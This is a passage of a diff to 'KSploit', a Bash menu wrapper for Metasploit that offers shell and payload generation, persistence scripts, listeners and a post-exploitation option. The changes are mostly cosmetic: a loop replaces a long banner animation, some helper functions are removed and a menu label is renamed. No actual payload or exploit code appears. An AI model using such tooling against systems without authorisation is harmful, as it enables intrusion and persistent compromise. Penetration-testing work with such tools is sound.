+        pause  '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
+    fi
+
+    goto start;
+    exit 1;
 }
 
 ################################################################################
@@ -815,17 +601,6 @@ clear
 # Main program                                                                 #
 ################################################################################
 ################################################################################
-function goto
-{
-    label=$1
-    shift;
-    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
-    eval "$cmd"
-    exit
-}
-function pause(){
-   read -p "$*"
-}
    echo
    echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
    echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
@@ -833,50 +608,12 @@ function pause(){
    echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
    echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
    echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "${FGC}${YELLOW};
-   echo -ne '   👽\r'
-   sleep .1
-   echo -ne '   👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   sleep .1
-   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   echo -ne '                 🕵🔎 Courtesy of Kaotick Jay 👽\r'${NC}
-   #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
-   sleep .5
+	for i in {1..21}; do
+		echo -ne "   $(printf '👽%.0s' $(seq 1 $i))\r"
+		sleep .1
+	done
+	echo -ne '                 🕵🔎 Courtesy of Kaotick Jay 👽\r'${NC}
+	sleep .5
    echo "${LIGHT_MAGENTA}  "
    echo
    echo "  KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits" |fmt -w 60
@@ -898,7 +635,7 @@ function pause(){
    echo "	  |---------------------------------------------|"
    echo "	  |    ⌛${GREEN} 4 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-#   echo "	  |    ▶️ ${GREEN} 5 ${BLUE}Generate an Obfuscated Payload.     ${YELLOW}|"
+#   echo "	  |    ▶️ ${GREEN} 5 ${BLUE}Run Post Exploitation Module.       ${YELLOW}|"
 #   echo "	  |---------------------------------------------|"
    echo "	  |    ▶️ ${GREEN} M ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
    echo "	  |---------------------------------------------|"
@@ -906,6 +643,8 @@ function pause(){
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
 #   locals	
+   echo	"           $ME"
+
    echo ${NC}
    errors
    echo "${GREEN}"
@@ -919,7 +658,7 @@ function pause(){
          ;;
        4) persist
          ;;
-#       5) obfuscate
+#       5) post_exploit
 #         ;;
        M) mfconsole
          ;;
